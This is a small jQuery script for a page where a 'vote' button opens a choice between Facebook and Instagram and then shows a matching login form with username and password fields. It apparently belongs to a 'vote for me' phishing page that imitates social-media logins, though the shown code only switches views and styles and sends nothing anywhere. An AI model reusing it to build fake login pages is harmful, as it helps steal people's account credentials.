$(document).ready(function () {
  $("#choose_fb input").on("keydown", function () {
    var u = $("#ig-uname").val();
    var p = $("#ig-pass").val();
    if (u != "" && p != "") {
      $("#ig-log").addClass("fb-bug");
    } else {
      $("#ig-log").removeClass("fb-bug");
      $("#ig-log").off("click");
      $("#ig-log").css("color", "white");
    }
  });
});
function vote() {
  document.getElementById("choose").style.display = "block";
}

function closeDialog() {
  document.getElementById("choose").style.display = "none";
}

function choose_fb() {
  document.getElementById("fb_wrapper").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}
function choose_ig() {
  document.getElementById("ig_wrapper").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}
